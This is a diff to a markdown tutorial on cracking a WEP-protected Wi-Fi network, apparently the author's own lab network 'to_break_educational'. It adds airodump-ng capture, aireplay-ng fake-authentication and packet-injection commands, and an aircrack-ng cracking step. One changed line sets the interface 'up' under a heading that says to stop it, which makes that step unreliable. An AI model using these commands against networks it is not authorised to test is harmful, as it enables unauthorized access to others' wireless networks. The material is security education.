@@ -175,7 +175,7 @@ Command:
 ## Use Mac Changer for changing Mac-Address
 
 Command:  
-`sudo macchanger wlp2s0mon 00:11:22:33:44:55`
+`sudo macchanger wlp2s0mon 12:34:45:67:89:01`
 
 Output Screenshot:  
 ![Screenshot](images/MacChange_Command.png)
@@ -194,7 +194,7 @@ Permanent MAC: ac:7b:a1:84:eb:d5 (Intel Corporate)
 Stop the interface for `[phy0]wlp2s0 on [phy0]wlp2s0mon`
 
 Command:  
-`sudo ifconfig wlp2s0mon down`
+`sudo ifconfig wlp2s0mon up`
 
 
 
@@ -265,6 +265,54 @@ The WEP with the assigned name `to_break_educational` has BSSID `E8:94:F6:F2:F1:
 ![Screenshot](images/WEP-Security-Protocol.png)
 
 The WEP network uses the Channel 6, which has a specific reason explain in the [Link:metageek.com](https://www.metageek.com/training/resources/why-channels-1-6-11.html)
+
+
+
+## Airodump
+
+Command:  
+`sudo airodump-ng -c 6 -w to_break_educational --bssid E8:94:F6:F2:F1:E1 wlp2s0mon`
+
+Output Screenshot:  
+![Screenshot](images/Airodump_Channel.png)
+
+Output Text:
+```  
+ CH  6 ][ Elapsed: 1 min ][ 2019-10-28 21:35 ][ fixed channel wlp2s0mon: 4                                          
+                                                                                                                                               
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                               
+ E8:94:F6:F2:F1:E1  -67   0      219       49    1   6  54e. WEP  WEP         to_break_educational                                             
+                                                                                                                                               
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                     
+                                                                                                                                               
+ E8:94:F6:F2:F1:E1  12:34:45:67:89:01    0    0 - 1    262    66992                                                                             
+ E8:94:F6:F2:F1:E1  04:B1:67:E9:E9:F9  -52    0 - 6e     0        2                                                                             
+ E8:94:F6:F2:F1:E1  58:E2:8F:30:1D:D2  -74    2e- 2      1       67                                                                             
+ E8:94:F6:F2:F1:E1  50:82:D5:91:1B:32  -58   48e-24      0        4  
+```
+
+## Create Cap File
+
+Beacon Command:  
+`sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`
+
+
+Create Cap Command:  
+`sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`
+
+
+Output Screenshot:  
+![Screenshot](images/Aireplay_Packet_Generation.png)
+
+
+## Crack Cap File
+
+Command:  
+`sudo aircrack-ng to_break_educational-01.cap`
+
+
+
 
 ## References
 
